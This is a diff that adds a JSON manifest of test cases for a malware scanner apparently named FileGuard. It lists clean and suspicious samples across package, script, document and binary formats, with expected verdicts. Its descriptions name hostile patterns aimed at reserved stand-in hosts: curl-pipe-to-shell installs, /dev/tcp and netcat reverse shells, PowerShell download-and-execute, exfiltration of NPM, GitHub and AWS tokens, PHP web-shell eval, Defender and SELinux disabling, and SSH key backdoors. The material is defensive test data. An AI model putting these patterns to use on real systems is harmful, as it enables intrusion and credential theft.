@@ -1,0 +1,783 @@
+{
+  "generated_at": "2026-11-15 05:59 PST",
+  "seed": 241779665888799,
+  "generator": "/workspace/fileguard-testcases/_generator/gen.py",
+  "safety": "FileGuard inert test sample - non-functional, reserved addresses only",
+  "samples": [
+    {
+      "path": "01_npm_tarball/clean/harbor-ember-87-4.16.2.tgz",
+      "scenario": "npm_tarball",
+      "label": "clean",
+      "sha256": "3b6e50b5c50936bd9cf0e7cf98e0e98ff3a2e1b61add7d6b05cc7536442f7f0f",
+      "size": 619,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "01_npm_tarball/suspicious/uuidd-2.11.16.tgz",
+      "scenario": "npm_tarball",
+      "label": "suspicious",
+      "sha256": "14fb0d1ab6ee8e0798c2409716fd35a9d30ca24a36df404ef2c12a40f3532f4b",
+      "size": 935,
+      "planted_count": 4,
+      "planted": [
+        {
+          "id": "hook_curl_pipe",
+          "severity_expected": "critical",
+          "desc": "install 钩子直接 curl cdn.maple39.invalid | sh"
+        },
+        {
+          "id": "decoy_manifest",
+          "severity_expected": "high",
+          "desc": "附带与 package.json 不一致的 package.md，prepare 钩子脚本删除自身并替换清单（反取证）"
+        },
+        {
+          "id": "hook_node_dropper",
+          "severity_expected": "critical",
+          "desc": "postinstall 运行 scripts/setup.js，内含按平台分支的下载落地器（钩子脚本命中高危 → 升级严重）"
+        },
+        {
+          "id": "typosquat",
+          "severity_expected": "high",
+          "desc": "包名 uuidd 仿冒热门包"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": ""
+    },
+    {
+      "path": "02_pypi_sdist/clean/fg-pebble-orbit-3.3.18.tar.gz",
+      "scenario": "pypi_sdist",
+      "label": "clean",
+      "sha256": "d9e46e65467776d02aebc0bd562d0d2b640965c52258416e3114819d99813fee",
+      "size": 589,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "02_pypi_sdist/suspicious/flaskk-0.12.0.tar.gz",
+      "scenario": "pypi_sdist",
+      "label": "suspicious",
+      "sha256": "955975b5f79c53ed0ad120bdfdcce9fb6bc913ca590f2d5506af8e3dfb930df7",
+      "size": 932,
+      "planted_count": 5,
+      "planted": [
+        {
+          "id": "intree_backend",
+          "severity_expected": "medium",
+          "desc": "pyproject.toml 用不常见的包内自带构建后端（会产生 PY_UNCOMMON_BACKEND + PY_INTREE_BACKEND 两项中危）"
+        },
+        {
+          "id": "setup_net_exec",
+          "severity_expected": "high",
+          "desc": "setup.py 中 urllib.request.urlopen(198.51.100.114) 下载后 os.system 执行"
+        },
+        {
+          "id": "pth_file",
+          "severity_expected": "high",
+          "desc": ".pth 文件以 import 开头并 exec 解码内容（每次启动 Python 自动执行）"
+        },
+        {
+          "id": "typosquat",
+          "severity_expected": "high",
+          "desc": "包名 flaskk 仿冒热门 PyPI 包"
+        },
+        {
+          "id": "miner",
+          "severity_expected": "high",
+          "desc": "flaskk/__init__.py: 内嵌矿池地址 stratum+tcp:// 与 xmrig 参数"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK（安装钩子脚本命中高危特征时可升级为 BLOCK）",
+      "note": ""
+    },
+    {
+      "path": "03_pypi_wheel/clean/fg_maple_raven-3.8.19-py3-none-any.whl",
+      "scenario": "pypi_wheel",
+      "label": "clean",
+      "sha256": "94d719a817c85e3f5510d0d8c1a31c54b22de35371d2d345e6fef8fc54331455",
+      "size": 1515,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "03_pypi_wheel/suspicious/fg_xenon_sable-3.17.8-py3-none-any.whl",
+      "scenario": "pypi_wheel",
+      "label": "suspicious",
+      "sha256": "ce8fd246a4991c0b46b91b33cb98ca7ffd93fbe4020a6d25264573a859dc39d8",
+      "size": 2085,
+      "planted_count": 2,
+      "planted": [
+        {
+          "id": "cred_paths",
+          "severity_expected": "low",
+          "desc": "引用 ~/.aws/credentials、~/.pypirc、~/.ssh/id_rsa 路径"
+        },
+        {
+          "id": "sitecustomize",
+          "severity_expected": "medium",
+          "desc": "wheel 附带 sitecustomize.py"
+        }
+      ],
+      "expected_verdict": "NO_FINDINGS(风险 MEDIUM) 或 INCOMPLETE —— 单一中危不足以升级",
+      "note": ""
+    },
+    {
+      "path": "04_javascript/clean/tool_dates.js",
+      "scenario": "javascript",
+      "label": "clean",
+      "sha256": "636d647e90ac5ba490bd1be07fbfb044fd2a82b948756361077647e2848b75c5",
+      "size": 177,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "04_javascript/suspicious/update-orbit.js",
+      "scenario": "javascript",
+      "label": "suspicious",
+      "sha256": "8f47e54d98d791be5d324eb1649eb8309df1bca2c83f020c0f66048ebbeb80c3",
+      "size": 1180,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "reverse_base64_xor_decoder",
+          "severity_expected": "high",
+          "desc": "反转字符串 + Base64 + XOR 解码器（Axios 投毒同款混淆）"
+        },
+        {
+          "id": "env_token_exfil",
+          "severity_expected": "high",
+          "desc": "收集 NPM_TOKEN/GITHUB_TOKEN/AWS_SECRET_ACCESS_KEY 并 fetch 到 zephyr-amber.invalid"
+        },
+        {
+          "id": "obfuscated_eval",
+          "severity_expected": "high",
+          "desc": "Base64 编码后 eval 执行（解码内容为 curl|sh 下载执行）"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "05_python_script/clean/rename_nimbus.py",
+      "scenario": "python_script",
+      "label": "clean",
+      "sha256": "48fcbf6d1589761783f84824bcb771bd1ec902b686a6fcffff6c5ba56c176768",
+      "size": 191,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "05_python_script/suspicious/monitor_cobalt.py",
+      "scenario": "python_script",
+      "label": "suspicious",
+      "sha256": "709f93a9ffb4b6ff95300e17d37bcc91dd91dbd10f2ef7097fa4d45a2e03a2f5",
+      "size": 884,
+      "planted_count": 5,
+      "planted": [
+        {
+          "id": "env_tokens",
+          "severity_expected": "high",
+          "desc": "读取 AWS_SECRET_ACCESS_KEY/GITHUB_TOKEN/PYPI_TOKEN 并 requests.post 到 cdn.zephyr6.invalid"
+        },
+        {
+          "id": "self_delete",
+          "severity_expected": "medium",
+          "desc": "os.remove(__file__) 删除自身"
+        },
+        {
+          "id": "cred_paths",
+          "severity_expected": "low",
+          "desc": "引用 ~/.aws/credentials、~/.pypirc、~/.ssh/id_rsa 路径"
+        },
+        {
+          "id": "reverse_shell",
+          "severity_expected": "critical",
+          "desc": "Python 反弹 shell 特征串（socket→192.0.2.88，os.dup2）"
+        },
+        {
+          "id": "authorized_keys",
+          "severity_expected": "high",
+          "desc": "向 ~/.ssh/authorized_keys 追加公钥（登录后门）"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": ""
+    },
+    {
+      "path": "06_shell_script/clean/rotate.sh",
+      "scenario": "shell_script",
+      "label": "clean",
+      "sha256": "56ee40b6d89ec325108cc68bee87bc1fa4769b7e6d6c50c287715e9e03ce558b",
+      "size": 126,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "06_shell_script/suspicious/fix-summit.sh",
+      "scenario": "shell_script",
+      "label": "suspicious",
+      "sha256": "97029e44d5e37ab5c06d01cff4d67ce5d6fc4bfd569d781fbfd82ee9753e141a",
+      "size": 245,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "curl_pipe",
+          "severity_expected": "high",
+          "desc": "curl cinder-lattice.invalid | bash 下载即执行"
+        },
+        {
+          "id": "nc_shell",
+          "severity_expected": "critical",
+          "desc": "nc -e /bin/sh 反弹 shell 特征"
+        },
+        {
+          "id": "bashrc",
+          "severity_expected": "low",
+          "desc": "往 ~/.bashrc 追加启动命令"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": ""
+    },
+    {
+      "path": "07_powershell/clean/Get-ServicesReport.ps1",
+      "scenario": "powershell",
+      "label": "clean",
+      "sha256": "270dd93a36969ca2d6c9790212da2932972e2397a1015921a98100bf1f51aced",
+      "size": 100,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "07_powershell/suspicious/Install-Yonder.ps1",
+      "scenario": "powershell",
+      "label": "suspicious",
+      "sha256": "c06cb7ff3bc180887ea5d539477725df6a7431086226183b1d522bef6fbbacd1",
+      "size": 356,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "iex_download",
+          "severity_expected": "high",
+          "desc": "IEX (New-Object Net.WebClient).DownloadString(api.lattice-sync.invalid)"
+        },
+        {
+          "id": "defender_off",
+          "severity_expected": "medium",
+          "desc": "Set-MpPreference 关闭 Defender 实时防护"
+        },
+        {
+          "id": "run_key",
+          "severity_expected": "low",
+          "desc": "写 HKCU Run 键自启动"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "08_batch/clean/prepare.bat",
+      "scenario": "batch",
+      "label": "clean",
+      "sha256": "374181f0f764baafe6666a02c567b082a1ebc0117ad3cfcc0ac89a5336237e70",
+      "size": 110,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "08_batch/suspicious/setup_tundra.bat",
+      "scenario": "batch",
+      "label": "suspicious",
+      "sha256": "5b6b3ef09f2c91e9d02e838869e51f6e523bfaa4f835febe5793686a4a66e694",
+      "size": 622,
+      "planted_count": 5,
+      "planted": [
+        {
+          "id": "bitsadmin",
+          "severity_expected": "high",
+          "desc": "bitsadmin /transfer 下载后执行"
+        },
+        {
+          "id": "wevtutil",
+          "severity_expected": "medium",
+          "desc": "wevtutil cl 清除事件日志"
+        },
+        {
+          "id": "copy_masquerade",
+          "severity_expected": "high",
+          "desc": "复制 cmd.exe 为伪装名 exe"
+        },
+        {
+          "id": "ps_hidden_enc",
+          "severity_expected": "high",
+          "desc": "powershell -w hidden -ep bypass -enc"
+        },
+        {
+          "id": "certutil",
+          "severity_expected": "high",
+          "desc": "certutil -urlcache 下载并运行 exe"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "09_vbscript/clean/count_nimbus.vbs",
+      "scenario": "vbscript",
+      "label": "clean",
+      "sha256": "a36ff7305c4b8c5508c9d11fb8d0b8e8cdcbb33c6dec8217a9b8268e2c4bb7d5",
+      "size": 180,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "09_vbscript/suspicious/scan_6561.vbs",
+      "scenario": "vbscript",
+      "label": "suspicious",
+      "sha256": "cdeaecce3cb6fc4ff21a62260149b095af79da4b263a26f108bf644c02f301d7",
+      "size": 609,
+      "planted_count": 4,
+      "planted": [
+        {
+          "id": "ps_hidden",
+          "severity_expected": "medium",
+          "desc": "WScript.Shell 以隐藏窗口+Bypass 启动 PowerShell"
+        },
+        {
+          "id": "copy_masquerade",
+          "severity_expected": "high",
+          "desc": "copy wscript.exe 伪装成其他 exe"
+        },
+        {
+          "id": "regsvr32",
+          "severity_expected": "medium",
+          "desc": "regsvr32 /i:http scrobj（Squiblydoo）"
+        },
+        {
+          "id": "startup",
+          "severity_expected": "low",
+          "desc": "复制自身到 Startup 启动文件夹"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": "mshta 与 regsvr32 在引擎里同属 LOLBIN_DOWNLOAD，只算一项中危"
+    },
+    {
+      "path": "10_php/clean/contact_nimbus.php",
+      "scenario": "php",
+      "label": "clean",
+      "sha256": "35429d51d847df6f2e1f1b784504acc0ef5be778a3fc7cd3f1025957721f292e",
+      "size": 292,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "10_php/suspicious/upload-raven.php",
+      "scenario": "php",
+      "label": "suspicious",
+      "sha256": "ab4d7dc6068cc95f99bafff3d89d306eaf4f87ceba589e0c034f814589e584f3",
+      "size": 199,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "assert_cookie",
+          "severity_expected": "high",
+          "desc": "assert($_COOKIE) 变种"
+        },
+        {
+          "id": "eval_post",
+          "severity_expected": "high",
+          "desc": "eval($_POST[...]) 一句话木马特征"
+        },
+        {
+          "id": "miner",
+          "severity_expected": "high",
+          "desc": "矿池地址 stratum+tcp"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "11_office_ooxml/clean/team_offsite_agenda.docx",
+      "scenario": "office_ooxml",
+      "label": "clean",
+      "sha256": "3106308fe5aa500b3327092d2fac1fac3ef275a3f5aff51273fad9d22c3aa2e1",
+      "size": 1945,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "11_office_ooxml/suspicious/Contract_71124.docx",
+      "scenario": "office_ooxml",
+      "label": "suspicious",
+      "sha256": "a6ce57b2a9ce894bef30995d3faaa886374489b9bc7b9e16fa5af953606f4e75",
+      "size": 2351,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "dde_field",
+          "severity_expected": "high",
+          "desc": "DDEAUTO 字段调用 cmd.exe（只 echo）"
+        },
+        {
+          "id": "external_ole",
+          "severity_expected": "high",
+          "desc": "外部链接 OLE 对象 → cdn.cobalt11.invalid"
+        },
+        {
+          "id": "remote_template",
+          "severity_expected": "high",
+          "desc": "远程模板注入 attachedTemplate → http://192.0.2.108"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "12_pdf/clean/event_schedule_2026.pdf",
+      "scenario": "pdf",
+      "label": "clean",
+      "sha256": "549ecc41aa26757eed645e616a9622c091d04789595d07bcf272ea5943a568b8",
+      "size": 611,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": ""
+    },
+    {
+      "path": "12_pdf/suspicious/invoice_431.pdf",
+      "scenario": "pdf",
+      "label": "suspicious",
+      "sha256": "cfb97fc649659f3f019b6af0584fa11fcf5109a7c2118f628310555bec8db318",
+      "size": 1087,
+      "planted_count": 4,
+      "planted": [
+        {
+          "id": "uri_ip",
+          "severity_expected": "low",
+          "desc": "链接注释指向裸 IP 198.51.100.65（仅网络指标）"
+        },
+        {
+          "id": "obf_js",
+          "severity_expected": "medium",
+          "desc": "PDF 内 JS 用 eval(unescape(...)) 混淆（解码只是 app.alert(1)）"
+        },
+        {
+          "id": "openaction_js",
+          "severity_expected": "medium",
+          "desc": "/OpenAction 打开即执行 JavaScript（JS 内容是 if(false) 死代码）"
+        },
+        {
+          "id": "launch",
+          "severity_expected": "high",
+          "desc": "/Launch 动作启动 cmd.exe（只 echo）"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "13_zip_archive/clean/ember_photos_and_notes.zip",
+      "scenario": "zip_archive",
+      "label": "clean",
+      "sha256": "496a010465b4afa91e4e688b2e27868c6d7b4d6eaf34454ae61d25e8f8f4e81a",
+      "size": 966,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "含一层嵌套 zip，内容全是文本/CSV/PNG"
+    },
+    {
+      "path": "13_zip_archive/suspicious/delivery_649.zip",
+      "scenario": "zip_archive",
+      "label": "suspicious",
+      "sha256": "5062f72a59a1e0c652b8d20f1f158fba67b116edd93af52ff4f71fdbbb4c4b5e",
+      "size": 1256,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "eicar",
+          "severity_expected": "critical",
+          "desc": "EICAR 标准杀毒测试文件（无害，ClamAV/YARA 必报）"
+        },
+        {
+          "id": "curl_script",
+          "severity_expected": "high",
+          "desc": "内含 curl|sh 下载执行脚本"
+        },
+        {
+          "id": "pe_as_jpg",
+          "severity_expected": "high",
+          "desc": "PE 可执行文件伪装成 .jpg（PE 本身是无害最小程序）（内层 zip）"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": ""
+    },
+    {
+      "path": "14_nested_archive/clean/maple_project_backup.7z",
+      "scenario": "nested_archive",
+      "label": "clean",
+      "sha256": "8e03d33e83eb2342847a469f6565adbcfaf8bd93159baa6ba8f43d716db0e2cd",
+      "size": 883,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "7z → tar.gz → zip 三层，内容全是普通文件"
+    },
+    {
+      "path": "14_nested_archive/suspicious/backup_215.7z",
+      "scenario": "nested_archive",
+      "label": "suspicious",
+      "sha256": "c38a7b871a7f716b2ba3fd99125ae7dd53eed36c1bdcce58e9524006161d3862",
+      "size": 975,
+      "planted_count": 1,
+      "planted": [
+        {
+          "id": "js_dropper",
+          "severity_expected": "high",
+          "desc": "内含按平台分支下载落地的 JS（第 1 层：7z）"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": ""
+    },
+    {
+      "path": "15_pe_windows/clean/tinycalc_cobalt.exe",
+      "scenario": "pe_windows",
+      "label": "clean",
+      "sha256": "32e9fcbe8a55a660d00fe2134803da12bd6fdc491f742bd00d479502ea32defc",
+      "size": 1536,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "手工构造的最小 PE32，入口只有 xor eax,eax; ret；无签名（引擎只给 info）"
+    },
+    {
+      "path": "15_pe_windows/suspicious/Receipt_5708.exe",
+      "scenario": "pe_windows",
+      "label": "suspicious",
+      "sha256": "3e13252ee0eaeaa0fb855fec0087bc6a62741b377be8b2a32c76801a71c25018",
+      "size": 1536,
+      "planted_count": 1,
+      "planted": [
+        {
+          "id": "miner_string",
+          "severity_expected": "high",
+          "desc": "内嵌矿池地址 stratum+tcp:// 与 xmrig"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK",
+      "note": "入口只有 xor eax,eax; ret，导入的 API 从不调用"
+    },
+    {
+      "path": "16_elf_linux/clean/calc-ember",
+      "scenario": "elf_linux",
+      "label": "clean",
+      "sha256": "b50da1a1062d893d4b140cdb897e61b01fd82a5349b9a2c81dbb30ff2fa4d078",
+      "size": 16064,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "gcc 编译的 hello world"
+    },
+    {
+      "path": "16_elf_linux/suspicious/notes_56",
+      "scenario": "elf_linux",
+      "label": "suspicious",
+      "sha256": "be16c3ec53861d4753418f4f496c702b5241d2bb05061e3255b3c117be6fcba5",
+      "size": 16064,
+      "planted_count": 3,
+      "planted": [
+        {
+          "id": "miner",
+          "severity_expected": "high",
+          "desc": "内嵌矿池地址"
+        },
+        {
+          "id": "reverse_shell_str",
+          "severity_expected": "critical",
+          "desc": "内嵌反弹 shell 命令字符串（从不使用）"
+        },
+        {
+          "id": "ld_preload",
+          "severity_expected": "medium",
+          "desc": "引用 /etc/ld.so.preload"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": "main() 只打印 ok；可疑字符串只是数据"
+    },
+    {
+      "path": "17_debian_deb/clean/fg-meadow_2.11.25_all.deb",
+      "scenario": "debian_deb",
+      "label": "clean",
+      "sha256": "2b6cd5662dee8fc8c244c31dc35630928ac754370ff4c75b4cd9c89d77a8b1f0",
+      "size": 822,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "postinst 只 echo"
+    },
+    {
+      "path": "17_debian_deb/suspicious/fg-pixel_0.4.14_all.deb",
+      "scenario": "debian_deb",
+      "label": "suspicious",
+      "sha256": "75315acf8a5c23d23e384433802de6744ae259fe9150ccefca24f494e42834dd",
+      "size": 850,
+      "planted_count": 5,
+      "planted": [
+        {
+          "id": "curl_pipe",
+          "severity_expected": "high",
+          "desc": "postinst curl orbit.update.invalid | bash 下载即执行"
+        },
+        {
+          "id": "sudoers_d",
+          "severity_expected": "high",
+          "desc": "postinst 写 /etc/sudoers.d/ 提权"
+        },
+        {
+          "id": "ld_preload",
+          "severity_expected": "high",
+          "desc": "postinst 写 /etc/ld.so.preload 全局库劫持"
+        },
+        {
+          "id": "reverse_shell",
+          "severity_expected": "critical",
+          "desc": "postinst bash -i >& /dev/tcp/203.0.113.16 反弹 shell 特征"
+        },
+        {
+          "id": "disable_sec",
+          "severity_expected": "medium",
+          "desc": "postinst 关闭 SELinux / ufw / iptables"
+        }
+      ],
+      "expected_verdict": "BLOCK",
+      "note": "postinst 首行 exit 0；postinst 是安装钩子，命中高危 YARA 时引擎会升级为严重"
+    },
+    {
+      "path": "18_rpm/clean/fg-amber-0.13.8-1.noarch.rpm",
+      "scenario": "rpm",
+      "label": "clean",
+      "sha256": "2efcb08b5c73ba1366a6fb327183fbccbe346f4266b74dedb2605a948e2aba7c",
+      "size": 6184,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "无 scriptlet"
+    },
+    {
+      "path": "18_rpm/suspicious/fg-nimbus-4.12.28-1.noarch.rpm",
+      "scenario": "rpm",
+      "label": "suspicious",
+      "sha256": "96f1b40a265dbcdd76e1b6378b024ee7e3d3dccacd223e7ba6eca3de1b91839c",
+      "size": 6427,
+      "planted_count": 2,
+      "planted": [
+        {
+          "id": "disable_sec",
+          "severity_expected": "medium",
+          "desc": "%post 关闭 SELinux / ufw / iptables"
+        },
+        {
+          "id": "authorized_keys",
+          "severity_expected": "high",
+          "desc": "%post 追加 SSH 公钥到 authorized_keys"
+        }
+      ],
+      "expected_verdict": "HIGH_RISK（安装钩子脚本命中高危特征时可升级为 BLOCK）",
+      "note": "%post 首行 exit 0"
+    },
+    {
+      "path": "19_msi_installer/clean/KeplerBirch-1.7.4.msi",
+      "scenario": "msi_installer",
+      "label": "clean",
+      "sha256": "1a4883474fce1e4f55d47e4246d25f196d2301c7b77a45995ed0580a196bd4be",
+      "size": 3584,
+      "planted_count": 0,
+      "planted": [],
+      "expected_verdict": "NO_FINDINGS（环境缺项时可能 INCOMPLETE）",
+      "note": "只有 Property/Registry 表，不可安装"
+    },
+    {
+      "path": "19_msi_installer/suspicious/BirchUpdater-4.16.7.msi",
+      "scenario": "msi_installer",
+      "label": "suspicious",
+      "sha256": "f86a221dd59b14e9d83d5bf496e8520252b2b308d41d20025bb0296faa1af861",
+      "size": 3584,
+      "planted_count": 2,
+      "planted": [
+        {
+          "id": "ca_vbscript",
+          "severity_expected": "medium",
+          "desc": "CustomAction(VBScript, type 38) 内联脚本"
+        },
+        {
+          "id": "ca_cmd_http",
+          "severity_expected": "medium",
+          "desc": "CustomAction(EXE, type 50) cmd 下载"
+        }
+      ],
+      "expected_verdict": "NO_FINDINGS(风险 MEDIUM) 或 INCOMPLETE —— 单一中危不足以升级",
+      "note": "CustomAction 未排入任何执行序列，永不运行。注意疑似引擎 bug：msi_checks 用 ca[3:] 丢掉前 3 条 CustomAction（msiinfo export 的表头行本就不匹配正则），因此 ≤3 条 CustomAction 时可能全部漏报（预期结论里的 CustomAction 中危实际可能不出现）"
+    }
+  ],
+  "extra_clean_public_targets": [
+    {
+      "mode": "submit_pkg",
+      "cmd": "fg submit_pkg npm left-pad 1.3.0 --lang zh",
+      "expect": "NO_FINDINGS（源码比对/注册表查询缺项时 INCOMPLETE）"
+    },
+    {
+      "mode": "submit_pkg",
+      "cmd": "fg submit_pkg npm ms 2.1.3 --lang zh",
+      "expect": "NO_FINDINGS"
+    },
+    {
+      "mode": "submit_pkg",
+      "cmd": "fg submit_pkg pypi requests 2.32.3 --lang zh",
+      "expect": "NO_FINDINGS / INCOMPLETE（依赖较多）"
+    },
+    {
+      "mode": "submit_url",
+      "cmd": "fg submit_url https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz --lang zh",
+      "expect": "NO_FINDINGS"
+    },
+    {
+      "mode": "submit_url",
+      "cmd": "fg submit_url https://files.pythonhosted.org/packages/f9/9b/335f9764261e915ed497fcdeb11df5dfd6f7bf257d4a6a2a686d80da4d54/requests-2.32.3-py3-none-any.whl --lang zh --expected-sha256 70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6",
+      "expect": "NO_FINDINGS / INCOMPLETE"
+    }
+  ],
+  "engine_formats_not_built": [
+    "NSIS / Inno Setup / InstallShield 安装包（box 上没有对应编译器）",
+    "Mach-O（引擎对 Mach-O 恒报缺项 MACHO_CODESIGN_NOT_VERIFIED，必然 INCOMPLETE）",
+    "RAR（没有 rar 打包器）",
+    "加密压缩包（结果是 INCOMPLETE，不属于干净/可疑二分）"
+  ]
+}
